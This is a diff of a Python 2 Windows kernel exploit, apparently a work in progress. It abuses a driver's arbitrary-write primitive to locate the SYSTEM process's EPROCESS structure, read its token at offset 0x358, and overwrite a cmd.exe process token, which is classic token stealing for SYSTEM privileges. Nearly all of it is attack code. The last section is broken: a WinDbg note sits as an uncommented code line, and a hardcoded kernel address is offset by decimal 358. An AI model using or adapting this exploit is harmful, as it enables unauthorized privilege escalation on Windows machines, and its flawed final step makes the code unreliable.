@@ -170,16 +170,18 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
 
     # Calculate PsInitialSystemProcess offset in kernel land
 
-    ptr_to_system_proc_struct_base_ptr = kernel_base + (PsISP_User_Address - kernel_handle)
-    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_proc_struct_base_ptr
+    ptr_to_system_EPROCESS_struct_ptr = kernel_base + (PsISP_User_Address - kernel_handle)
+    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_EPROCESS_struct_ptr
 
-    #PsISP_kernel_address = c_ulonglong()
+    PsISP_kernel_address = c_ulonglong()
 
-    system_proc_struct_base_ptr = kernelwriteQWORD(driver, ptr_to_system_proc_struct_base_ptr, USER_MEM_PAGE_PTR)
+    system_EPROCESS_struct_ptr = kernelWriteToAnywhere(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
     
-    print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_ADDR, POINTER(c_ulonglong))[0]
+    print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
 
-    return long(system_proc_struct_base_ptr)
+    system_EPROCESS_struct_ptr = cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+
+    return long(system_EPROCESS_struct_ptr)
 
 ################################################### USER WRITE FUNCTION ###########################################################
 
@@ -218,19 +220,8 @@ def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
 
 ################################################### KERNEL WRITE FUNCTION ###########################################################
 
-def kernelwriteQWORD(driver, target_address_of_value, target_address_to_write_over):
+def kernelWriteToAnywhere(driver, target_address_of_value, target_address_to_write_over):
     
-    # Write the what value address to target_address_to_write_over
-
-    #data = struct.pack("<Q", target_address_of_value)
-    #dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, target_address_to_write_over, data, len(data), byref(written))
-    
-    #if dwStatus == 0:
-        #print("Something went wrong while writing to memory","e")
-        #sys.exit()
-
-    # Pack the address of the what value and the current target process address we want to overwrite.
-
     data = struct.pack("<Q", target_address_of_value) + struct.pack("<Q", target_address_to_write_over)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
@@ -282,33 +273,20 @@ def readPrimitive(driver, USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
 
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 
-def get_current_eprocess(system_proc_struct_base_ptr, driver):
+def get_current_eprocess(eprocess_pointer, driver):
     """ Returns ptr to Current EPROCESS structure """
     PID_OFFSET = 0x2e0
-    PROC_FLINK_OFFSET = 0x2e8
+    ACTIVE_PROC_LINK_OFFSET = 0x2e8
     TOKEN_OFFSET = 0x358
 
-    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USER_ADDR)
+    kernelWriteToAnywhere(driver, eprocess_pointer + ACTIVE_PROC_LINK_OFFSET, USER_ADDR)
 
-    currentprocessBase = 0
+    currentEPROCESS = cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
-    system_proc_struct_base_ptr = flink - PID_OFFSET - 0x8
-
-    print "System Process Base Pointer", type(system_proc_struct_base_ptr), hex(system_proc_struct_base_ptr)
-
-    print "Process ID: ", unique_process_id
-
-    print c_ulonglong(unique_process_id).value
-
-    flink = readPrimitive(driver, system_proc_struct_base_ptr + PROC_FLINK_OFFSET, USER_ADDR)
-
-    print "Flink ", hex(flink)
-        
-    base_pointer = flink - PID_OFFSET - 0x8
-
-    return long(currentprocessBase)
+    return long(currentEPROCESS)
 
 ####################################### GET DRIVER HANDLE ######################################
+
 def getDriver():
 
     driver = kernel32.CreateFileA(
@@ -343,16 +321,22 @@ def executeOverwrite():
         # Get system process base.
 
         print "MAIN Got Kernel Base, Getting System Process Base!"
-        system_proc_struct_base_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)
+        system_EPROCESS_struct_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)
 
         # Define our expected offsets for this version of Windows.
+        ACTIVE_PROC_LINK_OFFSET = int(0x2e8)
+        TOKEN_OFFSET = int(0x358)
 
-        PROC_FLINK_OFFSET = 0x2e8
-        TOKEN_OFFSET = 0x358
+        # Calculate SYSTEM token
+        location_of_system_token = system_EPROCESS_struct_ptr + TOKEN_OFFSET 
 
-            #kernelwriteQWORD(driver, system_token_address, current_token)
+        kernelWriteToAnywhere(driver, location_of_system_token, USER_MEM_PAGE_PTR)
+        system_token_value = cast(USER_ADDR, POINTER(c_ulonglong))[0]
+        print "SYSTEM_TOKEN is: " + hex(system_token_value)
 
-        #print "MAIN Success!"
+                                                          #check the debugger for the cmd memory process
+                                                          !process 0 0 cmd.exe then add 0x358
+        kernelWriteToAnywhere(driver, system_token_value, 0xffff9d0d9a564700+358)
 ############################################ RUN ################################################
 
 executeOverwrite()
